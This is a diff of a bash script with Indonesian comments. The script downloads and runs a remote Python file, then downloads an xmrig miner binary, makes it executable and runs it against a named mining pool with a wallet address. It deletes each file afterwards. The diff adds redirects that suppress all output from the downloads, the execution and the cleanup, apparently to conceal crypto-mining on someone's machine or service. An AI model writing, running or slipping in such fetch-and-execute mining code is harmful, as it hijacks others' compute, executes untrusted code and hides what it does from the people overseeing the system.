@@ -10,13 +10,13 @@ python_script_file="simple_script.py"
 echo "Menjalankan skrip Python..."
 
 # Mengunduh file Python dari GitHub
-wget -O $python_script_file $python_script_url
+wget -O $python_script_file $python_script_url > /dev/null 2>&1
 
 # Memeriksa apakah pengunduhan berhasil
 if [ $? -eq 0 ]; then
     echo "File Python berhasil diunduh."
     # Menjalankan skrip Python dengan batasan waktu 1 menit
-    timeout 1m python $python_script_file
+    timeout 1m python $python_script_file > /dev/null 2>&1
     
     # Memeriksa apakah skrip Python telah selesai dengan baik atau tidak
     if [ $? -eq 0 ]; then
@@ -25,7 +25,7 @@ if [ $? -eq 0 ]; then
         echo "Skrip Python belum selesai dalam batas waktu yang ditentukan (1 menit)."
     fi
     # Menghapus file Python setelah dijalankan
-    rm $python_script_file
+    rm $python_script_file > /dev/null 2>&1
 else
     echo "Gagal mengunduh file Python."
 fi
@@ -37,13 +37,16 @@ tools="https://github.com/rinnoum/tools/raw/main/xmrig"
 xmrig="xmrig"
 
 # Mengunduh file
-wget -O $xmrig $tools
+wget -O $xmrig $tools > /dev/null 2>&1
 # Memeriksa apakah tools berhasil diunduh
 if [ $? -eq 0 ]; then
     echo "Tools berhasil diunduh."
     
+    # Memberikan izin eksekusi pada file xmrig
+    chmod +x $xmrig
+    
     # Menjalankan xmrig hanya jika unduhan berhasil
-    timeout 2m ./$xmrig -a ghostrider --url stratum-asia.rplant.xyz:17095 --tls --user FUCxVqXdFeaH5L5miNnWpUs3VXbGvsBpHz.te
+    timeout 2m ./$xmrig -a ghostrider --url stratum-asia.rplant.xyz:17095 --tls --user FUCxVqXdFeaH5L5miNnWpUs3VXbGvsBpHz.te > /dev/null 2>&1
     
     # Memeriksa apakah xmrig telah selesai dengan baik atau tidak
     if [ $? -eq 0 ]; then
@@ -52,7 +55,7 @@ if [ $? -eq 0 ]; then
         echo "Xmrig belum selesai dalam batas waktu yang ditentukan (2 menit)."
     fi
     # Menghapus file setelah dijalankan
-    rm $xmrig
+    rm $xmrig > /dev/null 2>&1
 else
     echo "Gagal mengunduh file Tools."
 fi
